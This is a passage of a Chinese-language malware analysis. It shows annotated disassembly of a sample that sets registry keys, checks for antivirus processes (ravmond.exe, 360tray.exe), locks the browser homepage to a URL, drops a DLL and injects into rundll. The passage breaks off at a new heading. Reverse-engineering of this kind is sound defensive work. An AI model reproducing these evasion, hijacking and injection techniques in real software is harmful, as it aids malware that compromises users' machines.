
```
0040443F   .  B8 5C194000   MOV EAX,复件_123.0040195C
00404444   .  E8 A7D1FFFF   CALL 复件_123.004015F0
00404449   .  51           PUSH ECX
0040444A   .  56           PUSH ESI
0040444B   .  8D45 F0      LEA EAX,DWORD PTR SS:[EBP-10]
0040444E   .  57           PUSH EDI
0040444F   .  50           PUSH EAX
00404450   .  E8 93CEFFFF  CALL 复件_123.004012E8
00404455   .  59           POP ECX
00404456   .  8365 FC 00   AND DWORD PTR SS:[EBP-4],0
0040445A   .  50           PUSH EAX
0040445B   .  B9 E4E54300  MOV ECX,复件_123.0043E5E4
00404460   .  E8 43D1FFFF  CALL <JMP.&MFC42.#858_??4CString@@QAEABV>
00404465   .  834D FC FF   OR DWORD PTR SS:[EBP-4],FFFFFFFF
00404469   .  8D4D F0      LEA ECX,DWORD PTR SS:[EBP-10]
0040446C   .  E8 3BD0FFFF  CALL <JMP.&MFC42.#800_??1CString@@QAE@XZ>
00404471   .  E8 8AEBFFFF  CALL 复件_123.00403000                 //创建注册表
00404476   .  E8 E4EFFFFF   CALL 复件_123.0040345F                 //创建注册表
0040447B   .  8B35 54504000 MOV ESI,DWORD PTR DS:[<&KERNEL32.Sleep>] ;  kernel32.Sleep
00404481   .  BF C8000000   MOV EDI,0C8
00404486   .  57            PUSH EDI                                ; /Timeout => 200. ms
00404487   .  FFD6          CALL ESI                                ; \Sleep    //睡眠 200.ms
00404489   .  E8 72FBFFFF   CALL 复件_123.00404000                 //遍历进程查找 ravmond.exe
0040448E   .  85C0          TEST EAX,EAX
00404490   .  74 0C         JE SHORT 复件_123.0040449E
00404492   .  E8 1CFEFFFF   CALL 复件_123.004042B3
00404497   .  E8 75FEFFFF   CALL 复件_123.00404311
0040449C   .  EB 0E         JMP SHORT 复件_123.004044AC
0040449E   >  E8 E6FEFFFF   CALL 复件_123.00404389                 //遍历进程查找 360tray.exe
004044A3   .  85C0          TEST EAX,EAX
004044A5   .  75 05         JNZ SHORT 复件_123.004044AC
004044A7   .  E8 2EFDFFFF   CALL 复件_123.004041DA                 //查找 IEXPLORE.EXE 锁定主页为 http://www.rom12580.cn
004044AC   >  57            PUSH EDI
004044AD   .  FFD6          CALL ESI
004044AF   .  E8 16ECFFFF   CALL 复件_123.004030CA                 //开始释放文件
004044B4   .  E8 58EDFFFF   CALL 复件_123.00403211                 //创建目录释放文件
004044B9   .  A3 ECE54300   MOV DWORD PTR DS:[43E5EC],EAX
004044BE   .  E8 EEEEFFFF   CALL 复件_123.004033B1                 //释放 iksii.dll 文件
004044C3   .  57            PUSH EDI
004044C4   .  FFD6          CALL ESI
004044C6   .  E8 D6EDFFFF   CALL 复件_123.004032A1                 //注入到 rundll.exe 进程，并运行
004044CB   .  BF E8030000   MOV EDI,3E8
004044D0   .  57            PUSH EDI
004044D1   .  FFD6          CALL ESI
004044D3   .  E8 9FCBFFFF   CALL 复件_123.00401077                 //释放病毒体
004044D8   .  57            PUSH EDI
004044D9   .  FFD6          CALL ESI
004044DB   .  E8 C4FBFFFF   CALL 复件_123.004040A4
004044E0   .  8B4D F4       MOV ECX,DWORD PTR SS:[EBP-C]
004044E3   .  5F            POP EDI
004044E4   .  33C0          XOR EAX,EAX
004044E6   .  5E            POP ESI
004044E7   .  64:890D 00000>MOV DWORD PTR FS:[0],ECX
004044EE   .  C9            LEAVE
004044EF   .  C3            RETN
```

### 3、创建注册表键值

代码:

```
0040141D  /$  B8 8C184000   MOV EAX,复件_123.0040188C
00401422  |.  E8 C9010000   CALL 复件_123.004015F0
00401427  |.  83EC 0C       SUB ESP,0C
0040142A  |.  8365 FC 00    AND DWORD PTR SS:[EBP-4],0
0040142E  |.  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
00401431  |.  E8 C7FCFFFF   CALL 复件_123.004010FD
00401436  |.  68 60E04300   PUSH 复件_123.0043E060                 ;  ASCII "SOFTWARE\\Softfy\\PlugName"
0040143B  |.  68 02000080   PUSH 80000002
00401440  |.  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
00401443  |.  C645 FC 01    MOV BYTE PTR SS:[EBP-4],1
00401447  |.  E8 4BFDFFFF   CALL 复件_123.00401197                 //创建注册表项
0040144C  |.  85C0          TEST EAX,EAX
0040144E  |.  75 20         JNZ SHORT 复件_123.00401470
00401450  |.  FF75 08       PUSH DWORD PTR SS:[EBP+8]
00401453  |.  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
00401456  |.  68 54E04300   PUSH 复件_123.0043E054                 ;  ASCII "LogonName"
0040145B  |.  E8 BB0B0000   CALL 复件_123.0040201B                 //设置 logonname 值
00401460  |.  FF75 08       PUSH DWORD PTR SS:[EBP+8]
00401463  |.  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
00401466  |.  68 44E04300   PUSH 复件_123.0043E044                 ;  ASCII "LogonMainName"
0040146B  |.  E8 AB0B0000   CALL 复件_123.0040201B                 //设置 LogonMainName
00401470  |>  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
00401473  |.  E8 55FDFFFF   CALL 复件_123.004011CD                 //关闭设置
00401478  |.  8065 FC 00    AND BYTE PTR SS:[EBP-4],0
0040147C  |.  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-18]
0040147F  |.  E8 AEFCFFFF   CALL 复件_123.00401132
00401484  |.  834D FC FF    OR DWORD PTR SS:[EBP-4],FFFFFFFF
00401488  |.  8D4D 08       LEA ECX,DWORD PTR SS:[EBP+8]
0040148B  |.  E8 1C000000   CALL <JMP.&MFC42.#800_??1CString@@QAE@XZ>
00401490  |.  8B4D F4       MOV ECX,DWORD PTR SS:[EBP-C]
00401493  |.  64:890D 00000>MOV DWORD PTR FS:[0],ECX
0040149A  |.  C9            LEAVE
0040149B  \\. C3            RETN
```

### 4、创建键值 `HKEY_LOCAL_MACHINE\SOFTWARE\Softfy\PlugName`

代码:

```
00401197  /$  55            PUSH EBP
00401198  |.  8BEC          MOV EBP,ESP
0040119A  |.  51            PUSH ECX
0040119B  |.  56            PUSH ESI                                ;  复件_123.0043E5E8
0040119C  |.  8BF1          MOV ESI,ECX
0040119E  |.  FF75 0C       PUSH DWORD PTR SS:[EBP+C]
004011A1  |.  8D4E 08       LEA ECX,DWORD PTR DS:[ESI+8]
004011A4  |.  E8 09030000   CALL <JMP.&MFC42.#860_??4CString@@QAEABV>
004011A9  |.  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-4]
004011AC  |.  83C6 04       ADD ESI,4
004011AF  |.  50            PUSH EAX                                  ; /pDisposition
004011B0  |.  33C0          XOR EAX,EAX                               ; |
004011B2  |.  56            PUSH ESI                                  ; |pHandle
004011B3  |.  50            PUSH EAX                                  ; |pSecurity => NULL
004011B4  |.  68 3F000F00   PUSH 0F003F                               ; |Access = KEY_ALL_ACCESS
004011B9  |.  50            PUSH EAX                                  ; |Options => REG_OPTION_NON_VOLATILE
004011BA  |.  50            PUSH EAX                                  ; |Class => NULL
004011BB  |.  50            PUSH EAX                                  ; |Reserved => 0
004011BC  |.  FF75 0C       PUSH DWORD PTR SS:[EBP+C]               ; |Subkey
004011BF  |.  FF75 08       PUSH DWORD PTR SS:[EBP+8]               ; |hKey
004011C2  |.  FF15 08504000 CALL DWORD PTR DS:[<&ADVAPI32.RegCreateK>; \RegCreateKeyExA
004011C8  |.  5E            POP ESI
004011C9  |.  C9            LEAVE
004011CA  \\. C2 0800       RETN 8
```

### 5、还是创建注册表值

代码:
